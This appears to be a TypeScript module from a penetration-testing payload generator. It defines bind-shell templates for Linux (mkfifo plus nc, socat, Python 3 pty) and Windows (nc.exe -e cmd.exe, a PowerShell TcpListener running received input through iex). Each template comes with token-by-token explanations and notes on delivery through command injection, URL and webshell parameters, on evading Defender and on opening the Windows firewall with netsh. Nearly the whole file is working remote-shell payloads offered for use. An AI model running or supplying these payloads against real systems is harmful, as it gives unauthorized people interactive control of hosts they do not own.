import type { ListenerId, PayloadDef } from "./types";

const CONNECT: ListenerId[] = ["connect-nc", "connect-penelope"];
const ALL_LINUX = ["bash-prompt", "injected-linux", "url-param", "webshell-param", "php-system"] as const;
const DEFAULTS = { BIND_PORT: "4444" };
const BASH_C_PART = { token: "bash -c", explain: "-c: run the quoted string. Added outside a real bash prompt (injection, URL, system()) so dash does not choke on the payload." };
const SH_PART = { token: "/bin/sh -i", explain: "-i: interactive shell, started for whoever connects." };
const PS_LISTENER = '$listener = [System.Net.Sockets.TcpListener]{BIND_PORT};$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};' +
  "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
  "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
  "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()";
const ONE_CLIENT = "Most one-liners serve one connection: re-run it after you disconnect. Close it when done; anyone who finds the port gets the shell.";

export const BIND_SHELLS: PayloadDef[] = [
  {
    id: "bind-mkfifo-nc", generator: "shell", title: "mkfifo + nc bind", os: "linux", shape: "bind",
    contexts: [...ALL_LINUX], requires: ["nc"],
    template: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp {BIND_PORT} > /tmp/f",
    defaults: DEFAULTS,
    parts: [
      { token: "rm -f /tmp/f", explain: "-f: no error if the pipe does not exist yet; clears a stale one from a previous try." },
      { token: "mkfifo /tmp/f", explain: "Builds the named pipe that carries your keystrokes into the shell." },
      { token: "cat /tmp/f", explain: "Feeds whatever arrives on the pipe into the shell's stdin." },
      SH_PART,
      { token: "2>&1", explain: "Sends errors down the same pipe so you see them." },
      { token: "nc -lvnp", explain: "-l: listen instead of connect. -v: verbose. -n: no DNS. -p: the port to listen on. No -e: OpenBSD nc does not have it." },
      { token: "> /tmp/f", explain: "Writes your replies into the pipe, closing the loop." },
      BASH_C_PART,
    ],
    listeners: CONNECT,
    notes: ["Some OpenBSD nc builds want nc -l <port> (no -p). If it errors, drop -p and -v.", ONE_CLIENT],
  },
  {
    id: "bind-socat", generator: "shell", title: "socat bind with PTY", os: "linux", shape: "bind",
    contexts: [...ALL_LINUX], requires: ["socat"],
    template: "socat TCP-LISTEN:{BIND_PORT},reuseaddr,fork EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
    defaults: DEFAULTS,
    parts: [
      { token: "TCP-LISTEN:", explain: "Listens on the port; reuseaddr lets you restart it at once, fork serves every client, one after another." },
      { token: "EXEC:'bash -li'", explain: "-li: a login, interactive bash, started for each connection." },
      { token: "pty,stderr,setsid,sigint,sane", explain: "A real terminal for it: errors included, its own session, Ctrl-C reaches the shell, sane terminal settings." },
      BASH_C_PART,
    ],
    listeners: ["connect-socat", "connect-nc"],
    notes: ["Needs socat on the target, or a static socat binary transferred and run first. fork keeps the listener alive after you disconnect."],
  },
  {
    id: "bind-python3", generator: "shell", title: "Python 3 bind with PTY", os: "linux", shape: "bind",
    contexts: [...ALL_LINUX], requires: ["python3"],
    template: `python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{BIND_PORT}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
    defaults: DEFAULTS,
    parts: [
      { token: "python3 -c", explain: "-c: run the quoted program. No nc or socat needed. Use python on old hosts (which python3 python)." },
      { token: "s.bind(", explain: "Listens on every interface (0.0.0.0) at the bind port." },
      { token: "s.accept()", explain: "Waits for you to connect, then serves that one client." },
      { token: "os.dup2(", explain: "Points stdin, stdout and stderr (0,1,2) at your connection." },
      { token: "pty.spawn(", explain: "Starts bash on a PTY, so su and sudo prompts work from the first prompt." },
      BASH_C_PART,
    ],
    listeners: CONNECT,
    notes: [ONE_CLIENT],
  },
  {
    id: "bind-nc-exe", generator: "shell", title: "nc.exe -e bind", os: "windows", shape: "bind",
    contexts: ["cmd", "powershell", "webshell-param", "url-param"], requires: ["nc-e"],
    template: "{FILE} -lvnp {BIND_PORT} -e cmd.exe", defaults: { ...DEFAULTS, FILE: "C:\\Windows\\Temp\\nc.exe" },
    parts: [
      { token: "nc.exe", explain: "The uploaded netcat. Defender may delete it: check it is still there if nothing answers." },
      { token: "-lvnp", explain: "-l: listen. -v: verbose. -n: no DNS. -p: the port to listen on." },
      { token: "-e", explain: "-e: run this program and attach it to whoever connects." },
      { token: "cmd.exe", explain: "The program handed to the connection." },
    ],
    listeners: CONNECT,
    notes: ["Needs an nc.exe built with -e; if it returns instantly, the build has no -e.",
      "Windows Defender Firewall drops unsolicited inbound: it may need an allow rule (admin) for the port.", ONE_CLIENT],
  },
  {
    id: "bind-ps", generator: "shell", title: "PowerShell TcpListener bind", os: "windows", shape: "bind",
    contexts: ["cmd", "webshell-param", "url-param"], requires: ["powershell"],
    template: `powershell -nop -c "${PS_LISTENER}"`, defaults: DEFAULTS,
    parts: [
      { token: "powershell", explain: "Starts PowerShell. Pure PowerShell: nothing to download or upload." },
      { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
      { token: "-c", explain: "-c: run the following command text. Double-quoted, so the inner text uses single quotes only." },
      { token: "TcpListener]", explain: "Listens on the bind port (every interface) for your connection." },
      { token: "AcceptTcpClient()", explain: "Waits for you to connect, then serves that one client." },
      { token: "-ne", explain: "-ne: not equal; the loop ends when you disconnect." },
      { token: "-TypeName", explain: "-TypeName: the class to create (ASCIIEncoding, to turn bytes into text)." },
      { token: "iex", explain: "Runs each line you send and returns the output." },
    ],
    listeners: CONNECT,
    notes: ["Run from cmd. From a PowerShell prompt, base64-encode it (UTF-16LE) like the reverse shell.",
      "The Windows firewall may need an allow rule (admin): netsh advfirewall firewall add rule name=\"<name>\" dir=in action=allow protocol=TCP localport=<port>; record the name for cleanup.", ONE_CLIENT],
  },
];
